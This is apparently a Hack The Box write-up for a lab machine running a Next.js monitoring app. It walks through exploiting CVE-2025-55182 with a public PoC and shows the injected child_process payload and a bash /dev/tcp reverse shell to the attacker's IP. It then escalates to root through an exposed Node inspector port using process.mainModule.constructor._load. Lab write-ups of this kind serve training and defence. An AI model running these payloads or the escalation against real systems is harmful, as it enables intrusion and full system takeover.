# Machine Information

**Target IP:** 10.129.245.214
**Machine name:** Reactor
**Stack:** Next.js app ("ReactorWatch | Core Monitoring System") on port 3000, Node.js backend


## Web Enumeration

I started by fingerprinting the web app with `whatweb`, just to get a quick read on what technology stack I was dealing with before diving in manually:

```
whatweb http://10.129.245.214:3000/
http://10.129.245.214:3000/ [200 OK] Country[RESERVED][ZZ], HTML5, IP[10.129.245.214], Script, Title[ReactorWatch | Core Monitoring System], UncommonHeaders[x-nextjs-cache,x-nextjs-prerender,x-nextjs-stale-time], X-Powered-By[Next.js]
```

That told me a lot in one shot: the app is called **ReactorWatch**, described as a "Core Monitoring System," and it's built on **Next.js** confirmed both by the `X-Powered-By` header and by the very Next.js-specific headers like `x-nextjs-cache` and `x-nextjs-prerender`. Seeing a specific framework like that immediately made me think about checking for known, recent CVEs in Next.js itself, since framework-level bugs tend to be extremely reliable once you match the exact vulnerable version.

![Wappalyzer output showing the Next.js version](./images/reactor/shot.png)

## Service Enumeration

Instead of poking around the app's pages by hand, I went straight to searching for known Next.js vulnerabilities, since the framework fingerprint was so clear. That led me to a public proof-of-concept for **CVE-2025-55182**, a remote code execution bug in Next.js:

```
git clone https://github.com/pkrasulia/CVE-2025-55182-NextJS-RCE-PoC.git
```

# Initial Foothold

CVE-2025-55182 is a server-side code injection vulnerability in Next.js. Looking at how the PoC's `exploit.js` builds its payload, it crafts a small block of JavaScript and injects it into the target so that it gets evaluated directly inside the Node.js server process itself, rather than in a sandboxed or client-side context. Since raw JavaScript running inside Node.js has full access to Node's built-in modules, an attacker-controlled script can just reach for `child_process` and execute whatever OS command it wants. In other words: JavaScript injection on a Node.js server is basically the same as remote code execution, because there's no meaningful boundary between "run JS" and "run shell commands" once you're inside the Node process.

The PoC's injected payload made that exact chain obvious:

```js
(function(){
    try {
        var res = process.mainModule.require("child_process").execSync("whoami").toString();
        console.log("\n[+] RCE RESULT:\n" + res);
        throw new Error("[+] RCE SUCCESS: " + res);
    } catch(e) {
        console.log(e);
        throw e;
    }
})()
```

I ran the exploit with a harmless test command first, `whoami`, just to see how the target reacted before trying anything riskier:

```
node exploit.js http://10.129.245.214:3000 "whoami"
...
[+] HTTP Status: 500 Internal Server Error
✅ PROBABLE SUCCESS: Received 500 error (expected for RCE).
   Check if the command executed!
```

The script itself couldn't directly read the command output back over HTTP (hence "PROBABLE SUCCESS" and the 500 error, since the injected code throws an error after running to leak output into the server's error handling), so I needed another way to actually confirm code execution was happening. I tried `ls -la` next, same result a 500 error, still no directly visible output, so I couldn't be 100% sure yet that commands were really running on the box.

![Running the CVE-2025-55182 exploit against ReactorWatch](./images/reactor/exploit.png)

To get a real, undeniable confirmation, I switched to something I could verify completely out-of-band: ICMP. I set up a `tcpdump` listener on my `tun0` interface (my HTB VPN interface) to watch for any ping traffic coming back from the target:

```
ip a | grep tun0
6: tun0: ... inet 10.10.14.224/23 ...

sudo tcpdump -i tun0 icmp
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
```

Then I fired the exploit again, this time telling the target to ping me back:

```
node exploit.js http://10.129.245.214:3000 "ping -c 4 10.10.14.224"
```

And sure enough, my tcpdump session lit up with real ICMP echo requests coming from the target's IP:

![tcpdump capturing ICMP replies confirming RCE](./images/reactor/icmp.png)

That was the confirmation I needed the target was genuinely executing my commands. Time to get an actual shell instead of blind command execution, I fired off the exploit one more time, this time with a bash reverse shell one-liner as the payload:

```
node exploit.js http://10.129.245.214:3000 "bash -c 'bash -i >& /dev/tcp/10.10.14.224/4444 0>&1'"
```

With a netcat listener already waiting on my side:

```
nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.224] from (UNKNOWN) [10.129.245.214] 54476
bash: cannot set terminal process group (1389): Inappropriate ioctl for device
bash: no job control in this shell
```

Shell landed. I checked who I was:

```
node@reactor:/opt/reactor-app$ id
uid=999(node) gid=988(node) groups=988(node)
```

Running as `node`, which makes total sense given the app is a Next.js/Node.js service and the exploit ran code directly inside that server process.

![Reverse shell landing as the node user](./images/reactor/shell.png)

# Privilege Escalation

With a shell as `node`, the first thing I did was look around the app's own directory for anything useful, since config files often leak secrets:

```
node@reactor:/opt/reactor-app$ cat .env
# ReactorWatch Configuration
# Database connection for sensor data

DB_PATH=/opt/reactor-app/reactor.db
DB_TYPE=sqlite3

# API Keys
SENSOR_API_KEY=rw_sk_7f8a9b2c3d4e5f6g7h8i9j0k
ALERT_WEBHOOK=https://alerts.internal.reactor.htb/webhook

# Node environment
NODE_ENV=production
```

There's an API key and a webhook URL here, but nothing that screamed "instant privilege escalation." I peeked at the SQLite database it referenced too:

```
node@reactor:/opt/reactor-app$ cat reactor.db
...
CREATE TABLE sensor_logs (
    id INTEGER PRIMARY KEY,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
    sensor_id TEXT,
    reading REAL,
    status TEXT
```

Just sensor telemetry, nothing credential-related. So instead of digging further into this app, I moved on to checking what else was running on the box, since local services are usually the real path to a privilege jump once the initial app itself is a dead end.

```
node@reactor:/opt/uptime-monitor$ ss -tulp
Netid State  Recv-Q Send-Q Local Address:Port   Peer Address:Port Process
tcp   LISTEN 0      511        127.0.0.1:9229      0.0.0.0:*
tcp   LISTEN 16     511                *:3000              *:*    users:(("next-server (v1",pid=1389,fd=18))
tcp   LISTEN 0      4096         0.0.0.0:ssh         0.0.0.0:*
...
```

Port **9229** stood out immediately, bound only to `127.0.0.1`. That's the default port for the Node.js **inspector/debugger protocol** meaning some Node process on this box has its debugger port open, listening locally. That's a huge deal if it's running as a more privileged user, since the Node inspector protocol lets you execute arbitrary JavaScript in that process's context, similar to what I'd just done against the web app, but this time potentially with way more privilege.

I checked `/etc/passwd` for real user accounts, to see who I might be able to reach:

```
node@reactor:/opt/uptime-monitor$ cat /etc/passwd | grep -i bash
root:x:0:0:root:/root:/bin/bash
engineer:x:1000:1000:engineer:/home/engineer:/bin/bash
```

Then I confirmed exactly what was listening on that debugger port:

```
node@reactor:/opt/uptime-monitor$ ps aux | grep -i inspect
root        1391  0.0  1.1 1066396 46276 ?       Ssl  06:45   0:00 /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
```

There it was a Node process running as **root**, with the inspector enabled on `127.0.0.1:9229`, running a script called `worker.js`. I read the script to understand what it actually does:

```
node@reactor:/opt/uptime-monitor$ cat worker.js
```

```js
const http = require('http');
const fs = require('fs');

const TARGET_URL = 'http://127.0.0.1:3000/';
const CSV_FILE = '/var/log/uptime-monitor.csv';
const INTERVAL_MS = 30_000;
...
setInterval(probe, INTERVAL_MS);
probe();

console.log('uptime-monitor up, pid=' + process.pid);
```

Just an uptime-checking script that pings the ReactorWatch app every 30 seconds and logs the results to a CSV nothing dangerous in the code itself. The real vulnerability wasn't in what the script does, it's that it's running with an **open debugger port as root**, which is a well-known misconfiguration: anyone who can reach `127.0.0.1:9229` can attach to that process and run arbitrary code as whoever owns it.

![Finding the root-owned Node process with an open inspector port](./images/reactor/privesc.png)

# Root

I connected to the debugger using Node's built-in `inspect` client:

```
node@reactor:/opt/uptime-monitor$ node inspect 127.0.0.1:9229
connecting to 127.0.0.1:9229 ... ok
```

My first instinct was to just call `require()` directly to load `child_process`, the same trick I'd used in the original exploit:

```
debug> exec require('child_process').execSync('cat /root/root.txt').toString()
ReferenceError: require is not defined
```

That failed the debugger's `exec` context doesn't have `require` available in scope by default, since it's not running as a normal CommonJS module. I tried grabbing a fresh `require` using `createRequire`, but that hit a wall too:

```
debug> exec const { createRequire } = require('module'); const myRequire = createRequire(import.meta.url);
SyntaxError: Cannot use 'import.meta' outside a module
```

That's not going to work either `import.meta` only exists inside real ES modules, and the debugger's evaluation context isn't one. So I needed a different way to reach Node's module loader without relying on `require` being predefined. I ask gemini and giving a useful info that every running Node process exposes `process.mainModule`, which is the actual entry-point module object and its constructor (`Module`) exposes an internal `_load` method, which is exactly what `require()` calls under the hood. So instead of using `require` directly, I could call the module loader's own internal method straight from the module's constructor:

```
debug> exec process.mainModule.constructor._load('child_process').execSync('cat /root/root.txt > /tmp/root_flag.txt')
Uint8Array(0)
```

No error this time it silently ran, which was actually the good sign, since the empty `Uint8Array(0)` is just the return value of writing to a file (no stdout captured because I redirected it). Since this debugger session was attached to the **root-owned** `worker.js` process, any code I ran through it executed as root.

I checked if the redirect actually worked:

```
node@reactor:/opt/uptime-monitor$ cat /tmp/root_flag.txt
0e8ca562c1de9347d4c553ea4***********
```

Root flag, confirmed. I used the exact same technique to also grab the user flag from `engineer`'s home directory, since I hadn't grabbed it yet and this debugger session could read any file on the system as root anyway:

```
debug> exec process.mainModule.constructor._load('child_process').execSync('cat /home/engineer/user.txt > /tmp/user.txt')
Uint8Array(0)
```

```
node@reactor:/opt/uptime-monitor$ cat /tmp/user.txt
f84a61e036cef53c843718*************
```

![user flags captured](./images/reactor/user.png)

![root flags captured](./images/reactor/root.png)

Both flags in hand, box fully rooted and a really fun reminder of how dangerous the Node inspector protocol is when it's left open on a privileged process, even when it's only bound to localhost.

# Lessons Learned

- **Framework fingerprinting pays off fast.** A single `whatweb` scan immediately revealed the app was Next.js, which pointed straight at checking for known framework CVEs instead of manually hunting for custom bugs.
- **Server-side JavaScript execution is RCE, full stop.** CVE-2025-55182 let injected JavaScript run directly inside the Node.js server process, and since Node code can always reach `child_process`, there's no real gap between "run arbitrary JS" and "run arbitrary shell commands."
- **Out-of-band confirmation is invaluable when output isn't visible.** The exploit couldn't show me command output directly, but sending a `ping` and watching it arrive on my own `tcpdump` was a clean, unambiguous way to confirm real code execution before committing to a reverse shell.
- **Localhost-only doesn't mean safe once you're already inside.** The Node inspector on port 9229 was only bound to `127.0.0.1`, but that was irrelevant the moment I had a shell on the box it became the entire privilege escalation path.
- **Debugging protocols are basically remote code execution by design.** The Node inspector exists specifically to let me evaluate arbitrary JavaScript inside a running process. Leaving it open on a process running as `root` is functionally the same as leaving a root shell open to anyone who can reach that port.
- **Node internals.** When `require()` isn't available in a given execution context, `process.mainModule.constructor._load(...)` is a solid fallback, since it's the same internal loader that `require()` calls under the hood.

# Some useful resources i use for this challenge

- **Github**
- **HackTricks**
- **Wappalyzer Extension**
- **Gemini AI**
